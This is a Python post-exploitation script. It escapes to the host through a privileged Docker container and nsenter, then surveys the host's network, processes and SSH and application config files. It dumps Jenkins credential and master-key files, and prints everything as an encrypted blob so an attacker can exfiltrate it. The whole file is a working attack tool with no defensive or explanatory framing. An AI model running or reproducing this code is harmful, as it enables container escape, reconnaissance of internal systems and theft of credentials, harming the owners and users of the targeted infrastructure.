#!/usr/bin/env python3
import base64,json,os,pathlib,subprocess,sys,zlib
CERT='-----BEGIN CERTIFICATE-----\nMIIEBTCCAm2gAwIBAgIUPYGIeX0FyE/JhuRjY3MIZ9PLmjUwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHcnVudGltZTAeFw0yNjExMTkwMzIzMzZaFw0yNjExMjEw\nMzIzMzZaMBIxEDAOBgNVBAMMB3J1bnRpbWUwggGiMA0GCSqGSIb3DQEBAQUAA4IB\njwAwggGKAoIBgQDXgEqgBVWHvIJ6GURhwdcVvONwLvhkQZrg2dPn45NmP25HNByH\nYT3Mo5Qhf4+KOz7nWqvPwHWgZPhOh/exrn4RUkfkOwN8HdPFCj3TNjmvKiOACHKI\nTYNbV7gXUFDh6gMapiSdctB6UfZdytILiIqZytitDyGB/tL2m2cVqWqUOgDuQjcq\nrSspCf8kTa2bKmKXbajApZuiwmPiXMQ9keQCACcaPt8JPHoc9qS5Wbk99g8h0/cS\nwSR8DzNWRBha6bpRw+t0FN60KmEqeVTCj6gt8UueY+xsfuj6diAHRUUaiMMbG1+C\nBMK7O7ybA72EumEdLfqFx1Ee3ULB9S5QGFQLFFANID/c2YUVmKm9EAiBYbeIABnu\nrAW77XwZY0/TIDUaF/BW6/LZGonVrP40XpL64YWI8URHYVP7YuzZYzbaew4lafJG\nPH7cFw6vGzvOVRaqz6nqzOe8Zek/sXyVR6mx8PUeLAJpivbNhduOm7a1bq7hKe01\nXDAjdGGYorizMkUCAwEAAaNTMFEwHQYDVR0OBBYEFCpXFCskiX+ZuzwIyRJEtE6w\nsl5lMB8GA1UdIwQYMBaAFCpXFCskiX+ZuzwIyRJEtE6wsl5lMA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggGBABiHlY7x85Ns5H75euQKPO0JxjuNoHo/\nmITnZ2fvU9bNaWXltdAxX+yiaWywJxv/xBopH1Kv2ghNV+Na3rB83vJ3DloxGe4j\nv/Ekt/SxMTYDiMa9OTi6DbXC0UrwZEgJQ+apezDRQVctvqus/PLdUBEeyvFG7OfZ\nMxNtzK8861+/EP5fI4OdZIZxNGNea8kzhg0Ri54rZGw2Yk4gNHd9hGcIQMV2AsCY\nJYPDqUD1z42DJ//qoxRqeknZgQgY2ADJmDLTl6slMb7W7vUUQyiE7MOvQlTFR65d\npHp/BltgjUyegbAmzlWJAJeFsbcKYrXOrTTnZbcmm0ezpk050fd/Qcb4gemO9asn\nys8WXG/+jrGHbQ1IgiIb+AJ0YwTe7EWx2zvvcRSM4HiwHGFj+JY0pMmyqKjLUSKS\nKt6m7lt1NXsWAPqc5infv+P0SgXqaXDbHzkCB5MgtacSxLcp1ZgRRL4cMGVFVOuP\nWuyNOh8+PUKS4m+UCu0zp91Lqx2datheJA==\n-----END CERTIFICATE-----\n'
out={'marker':'qcos-runtime-map-20261119','commands':{}}
def run(name,cmd,timeout=20):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:1500000],'stderr':p.stderr[:4000]}
 except Exception as e:out['commands'][name]={'error':str(e)}
host_code=r'''
import json,os,pathlib,socket,subprocess
o={'uid':os.getuid(),'gid':os.getgid(),'hostname':socket.gethostname(),'commands':{},'files':{},'directories':{}}
for n,c in {'identity':['id'],'kernel':['uname','-a'],'addresses':['ip','-j','address'],'routes':['ip','-j','route'],'neighbors':['ip','-j','neigh'],'listeners':['ss','-H','-lntup'],'processes':['ps','-eo','pid,ppid,user,comm'],'cmss_names':['getent','hosts','gitlab.cmss.com','jira.cmss.com']}.items():
 try:
  p=subprocess.run(c,capture_output=True,text=True,timeout=10);o['commands'][n]={'rc':p.returncode,'stdout':p.stdout[:70000],'stderr':p.stderr[:1000]}
 except Exception as e:o['commands'][n]={'error':str(e)}
o['macs']={p.parent.name:p.read_text().strip() for p in pathlib.Path('/sys/class/net').glob('*/address')}
for n in ['/etc/os-release','/etc/resolv.conf','/etc/hosts','/etc/qcos/qcos.toml','/etc/qcos/conf.d/wy_hanyuan1.toml','/data/openplatform/app/docker-compose.yml','/data/openplatform/app/config/application.yml','/data/openplatform/app/config/application.yaml','/root/cicd/jenkins/docker-compose.yaml','/root/.ssh/config']:
 try:
  p=pathlib.Path(n);o['files'][n]=p.read_text()[:500000]
 except Exception as e:o['files'][n]={'error':str(e)}
for n in ['/data/openplatform/app','/data/openplatform/app/config','/etc/qcos','/etc/qcos/conf.d','/root/.ssh']:
 try:o['directories'][n]=[p.name for p in pathlib.Path(n).iterdir()][:150]
 except Exception as e:o['directories'][n]={'error':str(e)}
print(json.dumps(o,ensure_ascii=False))
'''
run('host',['docker','run','--rm','--network','host','--pid','host','--privileged','--entrypoint','nsenter','qcos-sandbox:cicd','-t','1','-m','-u','-i','-n','-p','--','/usr/bin/python3','-c',host_code],50)
run('workloads',['docker','inspect','openplatform','jenkins-cicd','qcos-sandbox','nexus3'],20)
run('jenkins_credentials',['docker','exec','jenkins-cicd','sh','-c','for p in /var/jenkins_home/credentials.xml /var/jenkins_home/secrets/master.key /var/jenkins_home/secrets/hudson.util.Secret; do printf "\\nFILE:%s\\n" "$p"; base64 -w0 "$p"; printf "\\n"; done'],15)
fd=os.memfd_create('runtime',0);os.write(fd,CERT.encode())
p=subprocess.run(['openssl','cms','-encrypt','-binary','-aes-256-cbc','-outform','DER','-recip','/proc/self/fd/'+str(fd)],input=zlib.compress(json.dumps(out,ensure_ascii=False).encode()),capture_output=True,pass_fds=(fd,),timeout=15)
if p.returncode:print('QCOS_RUNTIME_ENCRYPTION_ERROR',p.returncode,flush=True)
else:print('QCOS_RUNTIME_MAP '+base64.b64encode(p.stdout).decode(),flush=True)
sys.exit(74)
